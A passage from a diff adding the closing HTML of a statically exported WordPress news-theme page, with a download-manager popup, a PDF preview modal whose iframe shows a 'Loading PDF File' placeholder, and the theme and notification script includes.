+                    jQuery('#wpdm-popup-link').modal('show');
+                    jQuery.post(this.href,{mode:'popup'}, function (res) {
+                        jQuery('#wpdm-modal-body').html(res);
+                    });
+                    return false;
+                });
+            });
+            //-->
+        </script>
+        <style type="text/css">
+            #wpdm-modal-body img {
+                max-width: 100% !important;
+            }
+            .wpdm-placeholder{
+                display: none;
+            }
+        </style>
+            <div class="w3eden">
+            <div class="modal" tabindex="-1" id="wpdm-pdf-preview">
+                <div class="modal-dialog modal-dialog-centered" style="width: 900px;max-width: 100%;">
+                    <div class="modal-content" style="box-shadow: 0 0 20px rgba(0,0,0,0.2);border-radius: 4px;overflow: hidden">
+                        <div class="modal-body p-0">
+                            <iframe id="wpdm-pdf-preview-frame" src="data:text/plain;base64,TG9hZGluZyBQREYgRmlsZS4uLg==" style="width: 100%;border: 0;height: 700px;margin: 0 0 -8px;padding: 0"></iframe>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <script>
+            jQuery(function ($){
+                $('.wpdm-pdf-preview').on('click', function (){
+                    $('#wpdm-pdf-preview-frame').attr('src', "data:text/plain;base64,TG9hZGluZyBQREYgRmlsZS4uLg==");
+                    $('#wpdm-pdf-preview-frame').attr('src', $(this).attr('href'));
+                });
+            });
+        </script>
+        <style>
+            #wpdm-pdf-preview {
+                background: rgba(0,0,0,0.4);
+            }
+        </style>
+        <script id="custom-script-js-extra">
+var wpdata = {"object_id":"9053","site_url":"..\/..\/..\/..\/index.html"};
+</script>
+<script src="../../../../wp-content/plugins/wp-meta-and-date-remover/assets/js/inspector.js?ver=1.0" id="custom-script-js"></script>
+<script src="../../../../wp-content/themes/ph-news-feed/js/navigation.js?ver=1.0.1.1" id="phnewsfeed-navigation-js"></script>
+<script src="../../../../wp-content/themes/ph-news-feed/lib/acmeticker/js/acmeticker.min.js?ver=6.7.1" id="acme-ticker-js"></script>
+<script src="../../../../wp-content/themes/ph-news-feed/lib/owl-carousel/dist/owl.carousel.js?ver=2.3.4" id="owl-carousel-js"></script>
+<script src="../../../../wp-content/themes/ph-news-feed/lib/sidr/jquery.sidr.min.js?ver=2.2.1" id="sidr-js"></script>
+<script src="../../../../wp-content/themes/ph-news-feed/js/theme.js?ver=1.0.1.1" id="phnewsfeed-theme-js-js"></script>
+<script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js?ver=1.0.0" id="remote_sdk-js" async data-wp-strategy="async"></script>
+
+</body>
+</html>
+<!-- Powered by Staatic (https://staatic.com/) -->
